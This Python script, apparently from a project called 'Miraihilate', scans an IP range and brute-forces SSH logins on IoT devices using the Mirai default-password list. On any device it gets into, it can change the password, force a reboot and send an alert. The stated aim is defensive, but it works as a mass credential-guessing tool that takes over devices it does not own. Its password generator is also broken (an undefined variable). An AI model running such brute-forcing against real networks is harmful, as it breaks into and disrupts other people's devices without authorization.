from netaddr import IPNetwork
from paramiko.ssh_exception import AuthenticationException, SSHException, BadHostKeyException
from telnetlib import Telnet
from datetime import datetime
from mysql.connector import Error
import mysql.connector
import paramiko
import json
import time
import sys
import random
import string
import re

# A list of root account username/password combinations for IoT devices
IOT_ROOT_USER_COMBINATIONS = ('admin1', 'password'), ('root', 'xc3511'), ('root', 'vizxv'), ('root', 'admin'), ('admin', 'admin'), ('root', '888888'), ('root', 'xmhdipc'), ('root', 'default'), ('root', 'juantech'), ('root', '123456'), ('root', '54321'), ('support', 'support'), ('root', ''), ('admin', 'password'), ('root', 'root'), ('root', '12345'), ('user', 'user'), ('admin', '(none)'), ('root', 'pass'), ('admin', 'admin1234'), ('root', '1111'), ('admin', 'smcadmin'), ('admin', '1111'), ('root', '666666'), ('root', 'password'), ('root', '1234'), ('root', 'klv123'), ('Administrator', 'admin'), ('service', 'service'), ('supervisor', 'supervisor'), ('guest', 'guest'), ('guest', '12345'), ('guest', '12345'), ('admin1', 'password'), ('administrator', '1234'), ('666666', '666666'), ('888888', '888888'), ('ubnt', 'ubnt'), ('root', 'klv1234'), ('root', 'Zte521'), ('root', 'hi3518'), ('root', 'jvbzd'), ('root', 'anko'), ('root', 'zlxx.'), ('root', '7ujMko0vizxv'), ('root', '7ujMko0admin'), ('root', 'system'), ('root', 'ikwb'), ('root', 'dreambox'), ('root', 'user'), ('root', 'realtek'), ('root', '00000000'), ('admin', '1111111'), ('admin', '1234'), ('admin', '12345'), ('admin', '54321'), ('admin', '123456'), ('admin', '7ujMko0admin'), ('admin', '1234'), ('admin', 'pass'), ('admin', 'meinsm'), ('tech', 'tech'), ('mother', 'fucker')

def log_to_db(uuid, data, start_timestamp, end_timestamp):
	try:
		config = {
			'user': 'root',
			'password': 'root',
			'host': 'localhost',
			'database': 'miraihilate',
			'port': 8889 # MAMP MySQL port
		}

		conn = mysql.connector.connect(**config)

		cursor = conn.cursor(prepared=True)

		sql = 'INSERT INTO scan_logs (user_uuid, data, start_timestamp, end_timestamp) VALUES (%s, %s, %s, %s)'

		cursor.execute(sql, (uuid, data, start_timestamp, end_timestamp))
		conn.commit()

		cursor.close()
		conn.close()
	except Error as e:
		print(e)

def gen_secure_pwd():
	pwd = gen_pwd()
	while (not any(c.isupper() for c in pwd)):
		pwd = gen_pwd()
	return pwd

def gen_pwd():
	alphabet = string.ascii_letters + string.digits + string.punctuation
	return ''.join(random.SystemRandom().choice(characters) for c in range(16))


# SSH Scanning Function
# ======================
# Arguments
#   - address: IP address
#   - cidr: CIDR prefix to specify address range
#   - cp: Change password on device and notify of change?
#   - nd: Notify device of vulnerability?
#
# Description
#   - Scans a specified network range and attempts to bruteforce into
#     the root accounts found on the IP addresses found using the default
#     list of username/password combinations defined as `passwords`, using
#     an SSH connection
#
# TODO: Fix request timeout errors
def scan_ssh_adv(address, cidr, cp, nd, tout='3', ec='0'):
	start_timestamp = datetime.now().strftime('%d %b %Y at %X')
	log = []
	iprange = IPNetwork(address + '/' + cidr)
	vulnerable_count = 0

	log.append('<html>')
	log.append('<h1>Advanced scan on network: ' + address + '/' + cidr + '</h1><br />')

	log.append('<b>Advanced Scan Specification</b><br />')
	log.append('<br /><br />')
	log.append('Start Time: ' + start_timestamp + '<br />')
	log.append('Scanning Mode: SSH<br />')
	log.append('IP Address Range: ' + str(iprange[0]) + ' - ' + str(iprange[-1]) + '<br />')

	if cp == '0':
		log.append('Changing device passwords? - No<br />')
	else:
		log.append('Changing device passwords? - Yes<br />')

	if nd == '0':
		log.append('Notify device about vulnerability? - No<br />')
	else:
		log.append('Notify device about vulnerability? - Yes<br />')

	log.append('Bruteforce Timeout: ' + tout + '<br />')
	result = ''
	if ec == '0':
		result = 'No'
	else:
		result = 'Yes'
	log.append('Executing extra commands: ' + result + '<br />')

	log.append('<br /><b>Scan Results</b><br />')
	log.append('<br /><br />')

	# Loop through ip addresses in the network range specified
	for ip in iprange:
		log.append('Trying SSH for IP "' + str(ip) + '" ...<br />')

		for acc in IOT_ROOT_USER_COMBINATIONS:
			try:
				# Create a new SSHClient
				device = paramiko.SSHClient()

				# Load host keys from a read-only system file
				device.load_system_host_keys()

				# When SSH server's hostname is not in system host keys or application
				# host keys, automatically add the hostname and new key to the local
				# HostKeys object and save it
				device.set_missing_host_key_policy(paramiko.AutoAddPolicy())

				# Connect to an SSH server and authenticate to it
				# Port 2281 is used for VM testing (actual SSH port is 22)
				device.connect(str(ip), username=acc[0], password=acc[1], port=2281, timeout=tout)

				# Connected to device so it is vulnerable
				# If it was not vulnerable the exception would be raised
				log.append('  - This device is vulnerable!<br />')
				vulnerable_count += 1

				# Check if notify device option was checked
				if nd == '1':
					device.exec_command("notify-send 'Miraihilate Alert!' 'A vulnerability has been detected in your device, which has been linked with Mirai malware.'")
					log.append('  - The device was alerted about the vulnerability.<br />')
				else:
					log.append('  - This device was not alerted about the vulnerability.<br />')

				# Check if change password option was checked
				if cp == '1':
					pwd = gen_secure_pwd()
					log.append(' - Changing password...<br />')
					# Change password
					device.exec_command('echo "' + str(acc[0]) + ':' + pwd + '" | chpasswd')
					log.append(' - Forcing device to reboot...<br />')
					# Force device reboot
					device.exec_command('reboot now')
					log.append(' - This device\'s password was changed.<br />')
				else:
					log.append(' - This device\'s password was not changed.<br />')

				if ec == '0':
					log.append(' - No extra commands were issued to the device!')
				else:
					# TODO: Parse input string into list
					# TODO: Execute commands from list
					log.append(' - Commands were performed on this device!')

				# Close the SSHClient and its underlying Transport
				log.append('  - Closing device...<br />')
				device.close()

				break
			except AuthenticationException:
				continue
			except (SSHException, BadHostKeyException, Exception):
				log.append('  - Could not connect to device via SSH!<br />')
				break

	log.append('<br /><br />')
	if vulnerable_count == 0:
		log.append('No vulnerable devices were found during this scan!<br />')
	elif vulnerable_count == 1:
		log.append(str(vulnerable_count) + ' vulnerable device was found!<br />')
	else:
		log.append(str(vulnerable_count) + ' vulnerable devices were found!<br />')

	# Finish log
	log.append('<br /></html>')

	# Return the vulnerable list and pretty html output
	return (start_timestamp, re.escape('\n'.join(log)))


uuid = sys.argv[1]
ip = sys.argv[2]
cidr = sys.argv[3]
cp = sys.argv[4]
nd = sys.argv[5]
tout = sys.argv[6]
ec = sys.argv[7]

# Prepare other variables for insertion into log database
scan = scan_ssh_adv(ip, cidr, cp, nd) # [0] = start timestamp, [1] = scan log
end_timestamp = datetime.now().strftime('%d %b %Y at %X')

log_to_db(uuid, scan[1], scan[0], end_timestamp)

print('success')
